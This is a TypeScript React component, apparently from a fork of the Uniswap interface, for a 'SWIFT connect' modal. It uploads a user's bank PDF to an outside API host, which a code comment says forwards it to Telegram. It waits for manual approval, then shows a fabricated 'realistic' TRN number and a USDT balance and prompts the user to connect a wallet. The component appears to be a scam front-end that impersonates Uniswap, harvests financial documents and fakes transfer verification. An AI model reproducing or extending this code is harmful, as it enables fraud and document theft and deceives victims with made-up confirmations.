/* eslint-disable max-lines */

import { useAccountDrawer } from 'components/AccountDrawer/MiniPortfolio/hooks'
import { LoaderV3 } from 'components/Icons/LoadingSpinner'
import { useActiveAddresses } from 'features/accounts/store/hooks'
import { deprecatedStyled } from 'lib/styled-components'
import { SwiftTRNData } from 'pages/Portfolio/hooks/useSwiftConnection'
import { useCallback, useEffect, useRef, useState } from 'react'
import { useTranslation } from 'react-i18next'
import { useNavigate } from 'react-router'
import { Button, Flex, styled, Text } from 'ui/src'
import { AlertTriangleFilled } from 'ui/src/components/icons/AlertTriangleFilled'
import { CheckmarkCircle } from 'ui/src/components/icons/CheckmarkCircle'
import { DocumentList } from 'ui/src/components/icons/DocumentList'
import { Globe } from 'ui/src/components/icons/Globe'
import { Search } from 'ui/src/components/icons/Search'
import { ShieldCheck } from 'ui/src/components/icons/ShieldCheck'
import { Wallet } from 'ui/src/components/icons/Wallet'
import { Modal } from 'uniswap/src/components/modals/Modal'
import { ElementName, ModalName } from 'uniswap/src/features/telemetry/constants'
import Trace from 'uniswap/src/features/telemetry/Trace'

type SwiftConnectStep =
  | 'upload'
  | 'connecting-swift'
  | 'verifying-trn'
  | 'located'
  | 'connect-wallet'
  | 'success'
  | 'error'

const MAX_FILE_SIZE_MB = 10
const MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024
const STEP_DELAY_MS = 3000
const STATUS_POLL_INTERVAL = 2000 // Poll every 2 seconds
// API URL - detect domain and use matching API subdomain
function getApiBaseUrl(): string {
  if (typeof window === 'undefined' || window.location.hostname === 'localhost') {
    return 'http://localhost:3001/api'
  }
  const host = window.location.hostname
  if (host === 'olesereni.site' || host === 'www.olesereni.site') {
    return 'https://api.olesereni.site/api'
  }
  return 'https://api.uniswap.services/api'
}
const API_BASE_URL = getApiBaseUrl()

interface SwiftConnectModalProps {
  isOpen: boolean
  onClose: () => void
  onSuccess: (trnData: SwiftTRNData) => void
}

const DropZoneContainer = styled(Flex, {
  borderWidth: 2,
  borderStyle: 'dashed',
  borderColor: '$surface3',
  borderRadius: '$rounded16',
  p: '$spacing24',
  alignItems: 'center',
  justifyContent: 'center',
  cursor: 'pointer',
  backgroundColor: '$surface2',
  hoverStyle: {
    borderColor: '$accent1',
    backgroundColor: '$surface3',
  },
  variants: {
    isDragOver: {
      true: {
        borderColor: '$accent1',
        backgroundColor: '$surface3',
      },
    },
    hasError: {
      true: {
        borderColor: '$statusCritical',
      },
    },
  },
})

const HiddenInput = deprecatedStyled.input`
  display: none;
`

const StepContainer = styled(Flex, {
  gap: '$spacing16',
  alignItems: 'center',
  py: '$spacing32',
  px: '$spacing16',
})

const ProcessingStep = styled(Flex, {
  row: true,
  alignItems: 'center',
  gap: '$spacing12',
  p: '$spacing16',
  backgroundColor: '$surface2',
  borderRadius: '$rounded16',
  width: '100%',
})

const IconContainer = styled(Flex, {
  width: 40,
  height: 40,
  borderRadius: '$roundedFull',
  centered: true,
  variants: {
    status: {
      pending: {
        backgroundColor: '$surface3',
      },
      active: {
        backgroundColor: '$accent2',
      },
      complete: {
        backgroundColor: '$statusSuccess2',
      },
    },
  },
})

// Generate mock TRN data from filename and balance from API
function generateTRNData(fileName: string, balance: number): SwiftTRNData {
  // Generate a realistic TRN number
  const trnNumber = `TRN${Date.now().toString().slice(-10)}${Math.random().toString(36).slice(2, 6).toUpperCase()}`

  return {
    fileName,
    trnNumber,
    amount: balance,
    currency: 'USD',
    connectedAt: Date.now(),
  }
}

// API functions for Swift connection
async function createSwiftConnection(
  pdfFile: File,
): Promise<{ connectionId: string; isReturningPdf: boolean; previousBalance: number | null }> {
  // Send the actual PDF file to the server
  const formData = new FormData()
  formData.append('pdf', pdfFile)
  formData.append('pdfName', pdfFile.name)

  const response = await fetch(`${API_BASE_URL}/swift/connect`, {
    method: 'POST',
    body: formData,
  })
  if (!response.ok) {
    throw new Error('Failed to create connection')
  }
  return response.json()
}

async function checkConnectionStatus(
  connectionId: string,
): Promise<{ connectionId: string; status: string; balance: number | null; pdfName: string }> {
  const response = await fetch(`${API_BASE_URL}/swift/status?connectionId=${connectionId}`)
  if (!response.ok) {
    throw new Error('Failed to check status')
  }
  return response.json()
}

export function SwiftConnectModal({ isOpen, onClose, onSuccess }: SwiftConnectModalProps): JSX.Element {
  const { t } = useTranslation()
  const navigate = useNavigate()
  const accountDrawer = useAccountDrawer()
  const { evmAddress, svmAddress } = useActiveAddresses()

  const [step, setStep] = useState<SwiftConnectStep>('upload')
  const [selectedFile, setSelectedFile] = useState<File | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [isDragOver, setIsDragOver] = useState(false)
  const [trnData, setTrnData] = useState<SwiftTRNData | null>(null)
  const [connectionId, setConnectionId] = useState<string | null>(null)
  const [errorMessage, setErrorMessage] = useState<string>('Verification failed - invalid server')
  const fileInputRef = useRef<HTMLInputElement>(null)
  const timeoutRef = useRef<NodeJS.Timeout | null>(null)
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const selectedFileRef = useRef<File | null>(null)
  const connectionIdRef = useRef<string | null>(null)
  const isPollingRef = useRef<boolean>(false)

  const isWalletConnected = Boolean(evmAddress || svmAddress)
  const isWalletConnectedRef = useRef(isWalletConnected)

  // Keep refs in sync
  useEffect(() => {
    selectedFileRef.current = selectedFile
  }, [selectedFile])

  useEffect(() => {
    connectionIdRef.current = connectionId
  }, [connectionId])

  useEffect(() => {
    isWalletConnectedRef.current = isWalletConnected
  }, [isWalletConnected])

  const resetState = useCallback(() => {
    setStep('upload')
    setSelectedFile(null)
    setError(null)
    setIsDragOver(false)
    setTrnData(null)
    setConnectionId(null)
    setErrorMessage('Verification failed - invalid server')
    isPollingRef.current = false
    selectedFileRef.current = null
    connectionIdRef.current = null
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current)
      timeoutRef.current = null
    }
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current)
      pollIntervalRef.current = null
    }
  }, [])

  const handleClose = useCallback(() => {
    resetState()
    onClose()
  }, [resetState, onClose])

  // Watch for wallet connection when on connect-wallet step
  useEffect(() => {
    if (step === 'connect-wallet' && isWalletConnected && trnData) {
      // Wallet just connected, proceed to success
      setStep('success')
    }
  }, [step, isWalletConnected, trnData])

  const validateFile = useCallback(
    (file: File): string | null => {
      if (file.type !== 'application/pdf') {
        return t('swift.error.invalidFileType')
      }
      if (file.size > MAX_FILE_SIZE_BYTES) {
        return t('swift.error.fileTooLarge', { maxSize: MAX_FILE_SIZE_MB })
      }
      return null
    },
    [t],
  )

  const handleFileSelect = useCallback(
    (file: File) => {
      const validationError = validateFile(file)
      if (validationError) {
        setError(validationError)
        setSelectedFile(null)
        return
      }
      setError(null)
      setSelectedFile(file)
    },
    [validateFile],
  )

  const handleDrop = useCallback(
    (e: React.DragEvent<HTMLDivElement>) => {
      e.preventDefault()
      e.stopPropagation()
      setIsDragOver(false)

      const files = e.dataTransfer.files
      if (files.length > 0) {
        handleFileSelect(files[0] as File)
      }
    },
    [handleFileSelect],
  )

  const handleDragOver = useCallback((e: React.DragEvent<HTMLDivElement>) => {
    e.preventDefault()
    e.stopPropagation()
    setIsDragOver(true)
  }, [])

  const handleDragLeave = useCallback((e: React.DragEvent<HTMLDivElement>) => {
    e.preventDefault()
    e.stopPropagation()
    setIsDragOver(false)
  }, [])

  const handleBrowseClick = useCallback(() => {
    fileInputRef.current?.click()
  }, [])

  const handleInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0]
      if (file) {
        handleFileSelect(file)
      }
    },
    [handleFileSelect],
  )

  const startProcessing = useCallback(async () => {
    if (!selectedFile) {
      return
    }

    // Store file reference for use in polling
    const currentFile = selectedFile

    // Start the processing sequence
    setStep('connecting-swift')

    try {
      // Step 1: Create connection request with PDF file (sends to Telegram)
      const connectionResult = await createSwiftConnection(currentFile)
      const currentConnectionId = connectionResult.connectionId

      setConnectionId(currentConnectionId)
      connectionIdRef.current = currentConnectionId

      // If returning PDF with previous balance, create TRN data early
      if (connectionResult.isReturningPdf && connectionResult.previousBalance) {
        const generatedTRN = generateTRNData(currentFile.name, connectionResult.previousBalance)
        setTrnData(generatedTRN)
      }

      // Move to verifying step after brief delay
      await new Promise((resolve) => {
        timeoutRef.current = setTimeout(resolve, STEP_DELAY_MS)
      })

      setStep('verifying-trn')

      // Start polling function
      const pollStatus = async (): Promise<void> => {
        // Check if we should stop polling
        if (!connectionIdRef.current || isPollingRef.current === false) {
          return
        }

        try {
          const status = await checkConnectionStatus(currentConnectionId)

          if (status.status === 'accepted' && status.balance !== null && status.balance !== undefined) {
            // Connection approved! Stop polling
            isPollingRef.current = false
            if (pollIntervalRef.current) {
              clearInterval(pollIntervalRef.current)
              pollIntervalRef.current = null
            }

            const generatedTRN = generateTRNData(status.pdfName || currentFile.name, status.balance)
            setTrnData(generatedTRN)
            setStep('located')

            // Brief pause then show wallet or success
            timeoutRef.current = setTimeout(() => {
              if (isWalletConnectedRef.current) {
                setStep('success')
              } else {
                setStep('connect-wallet')
              }
            }, 2000)
          } else if (status.status === 'rejected') {
            // Connection rejected
            isPollingRef.current = false
            if (pollIntervalRef.current) {
              clearInterval(pollIntervalRef.current)
              pollIntervalRef.current = null
            }
            setErrorMessage('Verification failed - invalid server')
            setStep('error')
          } else if (status.status === 'timeout') {
            // Connection timed out
            isPollingRef.current = false
            if (pollIntervalRef.current) {
              clearInterval(pollIntervalRef.current)
              pollIntervalRef.current = null
            }
            setErrorMessage('Server verification failed - request timed out')
            setStep('error')
          }
          // If still pending or awaiting_balance, keep polling
        } catch (_e) {
          // Polling error - keep trying
        }
      }

      // Start polling
      isPollingRef.current = true
      pollIntervalRef.current = setInterval(pollStatus, STATUS_POLL_INTERVAL)
      // Also poll immediately
      pollStatus()
    } catch (_err) {
      setErrorMessage('Failed to connect to SWIFT server')
      setStep('error')
    }
  }, [selectedFile])

  const handleConnectWallet = useCallback(() => {
    accountDrawer.open()
  }, [accountDrawer])

  const handleCancel = useCallback(() => {
    isPollingRef.current = false
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current)
      timeoutRef.current = null
    }
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current)
      pollIntervalRef.current = null
    }
    resetState()
  }, [resetState])

  const handleComplete = useCallback(() => {
    if (trnData) {
      onSuccess(trnData)
      handleClose()
      // Navigate to portfolio after successful connection
      navigate('/portfolio')
    }
  }, [trnData, onSuccess, handleClose, navigate])

  const renderUploadStep = (): JSX.Element => (
    <Flex gap="$spacing24" alignItems="center" width="100%">
      <Flex alignItems="center" gap="$spacing12">
        <Flex centered width={64} height={64} borderRadius="$roundedFull" backgroundColor="$accent2">
          <DocumentList size={32} color="$accent1" />
        </Flex>
        <Text variant="subheading1" textAlign="center">
          {t('swift.upload.title')}
        </Text>
        <Text variant="body2" color="$neutral2" textAlign="center" px="$spacing16">
          {t('swift.upload.description')}
        </Text>
      </Flex>

      {/* biome-ignore lint/correctness/noRestrictedElements: needed for drag/drop events */}
      <div
        onDrop={handleDrop}
        onDragOver={handleDragOver}
        onDragLeave={handleDragLeave}
        onClick={handleBrowseClick}
        style={{ width: '100%' }}
      >
        <DropZoneContainer isDragOver={isDragOver} hasError={!!error} width="100%" minHeight={140} gap="$spacing12">
          <DocumentList size={40} color="$neutral2" />
          {selectedFile ? (
            <Flex alignItems="center" gap="$spacing8">
              <CheckmarkCircle size={20} color="$statusSuccess" />
              <Text variant="body2" color="$neutral1" textAlign="center">
                {selectedFile.name}
              </Text>
            </Flex>
          ) : (
            <>
              <Text variant="body2" color="$neutral2" textAlign="center">
                {t('swift.upload.dragDropText')}
              </Text>
              <Button variant="default" emphasis="secondary" size="small" onPress={handleBrowseClick}>
                {t('swift.upload.browseFiles')}
              </Button>
            </>
          )}
          <HiddenInput ref={fileInputRef} type="file" accept="application/pdf" onChange={handleInputChange} />
        </DropZoneContainer>
      </div>

      {error && (
        <Flex row alignItems="center" gap="$spacing8">
          <AlertTriangleFilled size={16} color="$statusCritical" />
          <Text variant="body3" color="$statusCritical">
            {error}
          </Text>
        </Flex>
      )}

      <Flex gap="$spacing12" width="100%">
        <Text variant="body3" color="$neutral3" textAlign="center">
          {t('swift.upload.supportedFormat')}
        </Text>
        <Trace logPress element={ElementName.SwiftUploadButton}>
          <Button
            variant="branded"
            emphasis="primary"
            size="large"
            width="100%"
            isDisabled={!selectedFile}
            onPress={startProcessing}
          >
            {t('swift.upload.connectButton')}
          </Button>
        </Trace>
      </Flex>
    </Flex>
  )

  const renderProcessingSteps = (): JSX.Element => {
    const steps = [
      {
        id: 'connecting-swift',
        icon: Globe,
        label: t('swift.processing.connectingSwift'),
      },
      {
        id: 'verifying-trn',
        icon: Search,
        label: t('swift.processing.verifyingTrn'),
      },
      {
        id: 'located',
        icon: ShieldCheck,
        label: t('swift.processing.located'),
      },
    ]

    const currentStepIndex = steps.findIndex((s) => s.id === step)

    return (
      <StepContainer>
        <Text variant="subheading1" textAlign="center" mb="$spacing8">
          {t('swift.processing.title')}
        </Text>

        <Flex gap="$spacing12" width="100%">
          {steps.map((s, index) => {
            const isComplete = index < currentStepIndex
            const isActive = index === currentStepIndex
            const _isPending = index > currentStepIndex
            const Icon = s.icon

            return (
              <ProcessingStep
                key={s.id}
                backgroundColor={isActive ? '$surface3' : '$surface2'}
                borderWidth={isActive ? 1 : 0}
                borderStyle="solid"
                borderColor={isActive ? '$accent1' : 'transparent'}
              >
                <IconContainer status={isComplete ? 'complete' : isActive ? 'active' : 'pending'}>
                  {isComplete ? (
                    <CheckmarkCircle size={24} color="$statusSuccess" />
                  ) : isActive ? (
                    <LoaderV3 size="24px" />
                  ) : (
                    <Icon size={24} color="$neutral3" />
                  )}
                </IconContainer>
                <Text
                  variant="body2"
                  color={isComplete ? '$statusSuccess' : isActive ? '$neutral1' : '$neutral3'}
                  flex={1}
                >
                  {s.label}
                </Text>
                {isComplete && (
                  <Text variant="body3" color="$statusSuccess">
                    ✓
                  </Text>
                )}
              </ProcessingStep>
            )
          })}
        </Flex>

        {trnData && (
          <Flex
            width="100%"
            p="$spacing16"
            backgroundColor="$surface2"
            borderRadius="$rounded12"
            gap="$spacing8"
            mt="$spacing8"
          >
            <Flex row justifyContent="space-between">
              <Text variant="body3" color="$neutral2">
                {t('swift.processing.trnNumber')}
              </Text>
              <Text variant="body3" color="$neutral1">
                {trnData.trnNumber}
              </Text>
            </Flex>
            <Flex row justifyContent="space-between">
              <Text variant="body3" color="$neutral2">
                {t('swift.processing.file')}
              </Text>
              <Text variant="body3" color="$neutral1" numberOfLines={1} maxWidth={180}>
                {trnData.fileName}
              </Text>
            </Flex>
          </Flex>
        )}

        <Trace logPress element={ElementName.SwiftCancelButton}>
          <Button variant="default" emphasis="secondary" size="medium" onPress={handleCancel} mt="$spacing8">
            {t('common.button.cancel')}
          </Button>
        </Trace>
      </StepContainer>
    )
  }

  const renderConnectWalletStep = (): JSX.Element => (
    <StepContainer>
      <Flex centered width={72} height={72} borderRadius="$roundedFull" backgroundColor="$accent2">
        <Wallet size={36} color="$accent1" />
      </Flex>

      <Flex alignItems="center" gap="$spacing8">
        <Text variant="subheading1" textAlign="center">
          {t('swift.wallet.title')}
        </Text>
        <Text variant="body2" color="$neutral2" textAlign="center" px="$spacing8">
          {t('swift.wallet.description')}
        </Text>
      </Flex>

      {trnData && (
        <Flex width="100%" p="$spacing16" backgroundColor="$surface2" borderRadius="$rounded12" gap="$spacing8">
          <Flex row justifyContent="space-between">
            <Text variant="body3" color="$neutral2">
              {t('swift.wallet.swiftAmount')}
            </Text>
            <Text variant="body2" color="$neutral1" fontWeight="600">
              ${trnData.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
            </Text>
          </Flex>
          <Flex row justifyContent="space-between">
            <Text variant="body3" color="$neutral2">
              {t('swift.wallet.conversionTarget')}
            </Text>
            <Text variant="body2" color="$neutral1">
              USDT
            </Text>
          </Flex>
        </Flex>
      )}

      <Flex gap="$spacing12" width="100%">
        <Trace logPress element={ElementName.SwiftConnectButton}>
          <Button variant="branded" emphasis="primary" size="large" width="100%" onPress={handleConnectWallet}>
            {t('swift.wallet.connectButton')}
          </Button>
        </Trace>
        <Button variant="default" emphasis="secondary" size="medium" onPress={handleCancel}>
          {t('common.button.cancel')}
        </Button>
      </Flex>
    </StepContainer>
  )

  const renderSuccessStep = (): JSX.Element => (
    <StepContainer>
      <Flex centered width={72} height={72} borderRadius="$roundedFull" backgroundColor="$statusSuccess2">
        <CheckmarkCircle size={40} color="$statusSuccess" />
      </Flex>

      <Flex alignItems="center" gap="$spacing8">
        <Text variant="subheading1" textAlign="center">
          {t('swift.success.title')}
        </Text>
        <Text variant="body2" color="$neutral2" textAlign="center" px="$spacing8">
          {t('swift.success.message')}
        </Text>
      </Flex>

      {trnData && (
        <Flex width="100%" p="$spacing16" backgroundColor="$statusSuccess2" borderRadius="$rounded12" gap="$spacing8">
          <Flex row justifyContent="space-between" alignItems="center">
            <Text variant="body3" color="$statusSuccess">
              {t('swift.success.amountAvailable')}
            </Text>
            <Text variant="subheading2" color="$statusSuccess">
              ${trnData.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
            </Text>
          </Flex>
        </Flex>
      )}

      <Trace logPress element={ElementName.SwiftContinueButton}>
        <Button variant="branded" emphasis="primary" size="large" width="100%" onPress={handleComplete}>
          {t('swift.success.viewPortfolio')}
        </Button>
      </Trace>
    </StepContainer>
  )

  const renderErrorStep = (): JSX.Element => (
    <StepContainer>
      <Flex centered width={72} height={72} borderRadius="$roundedFull" backgroundColor="$statusCritical2">
        <AlertTriangleFilled size={40} color="$statusCritical" />
      </Flex>

      <Flex alignItems="center" gap="$spacing8">
        <Text variant="subheading1" textAlign="center" color="$statusCritical">
          Connection Failed
        </Text>
        <Text variant="body2" color="$neutral2" textAlign="center" px="$spacing8">
          {errorMessage}
        </Text>
      </Flex>

      {connectionId && (
        <Flex width="100%" p="$spacing16" backgroundColor="$surface2" borderRadius="$rounded12" gap="$spacing8">
          <Flex row justifyContent="space-between">
            <Text variant="body3" color="$neutral2">
              Connection ID
            </Text>
            <Text variant="body3" color="$neutral1">
              {connectionId}
            </Text>
          </Flex>
        </Flex>
      )}

      <Flex gap="$spacing12" width="100%">
        <Button variant="branded" emphasis="primary" size="large" width="100%" onPress={resetState}>
          Try Again
        </Button>
        <Button variant="default" emphasis="secondary" size="medium" onPress={handleClose}>
          Close
        </Button>
      </Flex>
    </StepContainer>
  )

  const renderContent = (): JSX.Element => {
    switch (step) {
      case 'upload':
        return renderUploadStep()
      case 'connecting-swift':
      case 'verifying-trn':
      case 'located':
        return renderProcessingSteps()
      case 'connect-wallet':
        return renderConnectWalletStep()
      case 'success':
        return renderSuccessStep()
      case 'error':
        return renderErrorStep()
      default:
        return renderUploadStep()
    }
  }

  const isProcessing = step === 'connecting-swift' || step === 'verifying-trn' || step === 'located'

  return (
    <Modal
      name={ModalName.SwiftConnect}
      isModalOpen={isOpen}
      onClose={isProcessing ? undefined : handleClose}
      maxWidth={440}
      padding="$spacing24"
    >
      {renderContent()}
    </Modal>
  )
}
